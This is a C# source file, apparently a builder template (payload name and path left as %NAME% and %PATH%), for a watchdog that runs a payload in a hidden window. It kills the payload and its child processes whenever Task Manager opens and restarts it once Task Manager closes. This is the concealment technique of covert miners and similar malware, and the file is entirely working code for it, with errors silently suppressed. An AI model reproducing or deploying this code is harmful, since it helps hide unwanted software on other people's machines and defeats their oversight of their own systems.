using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Management;
using System.Threading;
using System.Windows.Forms;

namespace Kronos
{
    class Program
    {

        [STAThread]
        public static void Main()
        {

            StartmyZed();
            System.Timers.Timer timer = new System.Timers.Timer(1000);
            timer.Elapsed += Timer_Elapsed;
            timer.Start();
            while (true)
            {

            }

        }
        private static void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            System.Diagnostics.Process[] proc = System.Diagnostics.Process.GetProcessesByName("TaskMgr");
            if (proc.Length > 0)
            {
                StopmyZed();
            }
            else
            {
                StartmyZed();
            }

        }



        public static void StartmyZed()
        {

            try
            {
                if (Information.UBound(Process.GetProcessesByName("%NAME%")) < 0)
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.FileName = @"%PATH%";
                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(processStartInfo);
                    //Process.GetCurrentProcess().Kill();
                    //Application.Exit();
                }
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
            }


        }
        public static void StopmyZed()
        {
            var processes = Process.GetProcessesByName("%NAME%");
            foreach (var p in processes)
            {
                if (Information.UBound(Process.GetProcessesByName("%NAME%")) < 0)
                {
                }
                else
                {
                    //Process.Start(new ProcessStartInfo
                    //{
                    //    FileName = "cmd",
                    //    Arguments = "/k start /b Taskkill /IM " + "%NAME%" + ".exe" + " /F & exit",
                    //    CreateNoWindow = true,
                    ///    WindowStyle = ProcessWindowStyle.Hidden,
                    //   UseShellExecute = true,
                    //   ErrorDialog = false,
                    //});
                    KillProcessAndChildren(Convert.ToInt32(p.Id));
                }
            }

        }
        private static void KillProcessAndChildren(int pid)
        {

            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch
            {

            }

        }
    }
}

